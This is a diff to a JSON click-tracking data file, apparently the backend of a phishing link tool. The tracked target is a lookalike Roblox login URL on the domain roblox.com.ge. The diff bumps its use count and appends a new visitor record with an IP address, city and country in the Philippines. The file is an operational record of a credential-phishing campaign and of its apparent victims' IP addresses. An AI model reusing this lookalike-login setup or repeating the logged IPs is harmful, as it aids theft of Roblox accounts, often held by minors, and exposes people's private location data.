@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1186,
+    "useCount": 1187,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9630,6 +9630,14 @@
         "ip": "49.151.165.230",
         "country": "Philippines",
         "city": "Clark Freeport Zone",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777298683766,
+        "ip": "120.29.90.227",
+        "country": "Philippines",
+        "city": "Baguio City",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
